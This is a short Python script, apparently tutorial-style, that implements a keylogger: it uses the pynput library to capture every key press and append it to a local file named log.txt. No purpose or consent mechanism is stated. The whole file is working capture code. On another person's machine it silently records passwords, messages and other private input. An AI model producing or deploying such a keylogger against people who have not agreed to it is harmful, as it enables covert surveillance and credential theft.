import pynput
from pynput.keyboard import Key, Listener

# Function to be called when a key is pressed
def on_press(key):
    # Open the log file in append mode
    with open("log.txt", "a") as f:
        # Write the pressed key to the file, followed by a newline
        f.write(str(key) + "\n")

# Create a listener object that calls the on_press function when a key is pressed
with Listener(on_press=on_press) as listener:
    # Start the listener and wait for it to finish
    listener.join()